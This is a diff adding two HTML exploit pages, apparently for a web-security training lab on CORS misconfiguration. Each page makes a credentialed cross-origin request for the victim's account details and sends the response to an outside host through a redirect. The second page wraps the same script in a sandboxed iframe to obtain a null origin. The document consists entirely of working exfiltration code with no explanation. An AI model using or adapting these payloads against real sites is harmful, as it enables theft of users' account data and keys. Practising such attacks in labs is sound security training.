@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onload = response;
+        xhr.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+        xhr.withCredentials = true;
+        xhr.send();
+    
+        function response() {
+            location='http://pip3lee101-64604.portmap.host:64604/?lee101='+this.responseText;
+        };
+    </script>
+</body>
+</html>
+
+// orgin: null
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Document</title>
+</head>
+<body>
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+        var xhr = new XMLHttpRequest();
+        xhr.onload = response;
+        xhr.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+        xhr.withCredentials = true;
+        xhr.send();
+    
+        function response() {
+            location='http://pip3lee101-64604.portmap.host:64604/?lee101='+this.responseText;
+        };
+    </script>"></iframe>
+</body>
+</html>
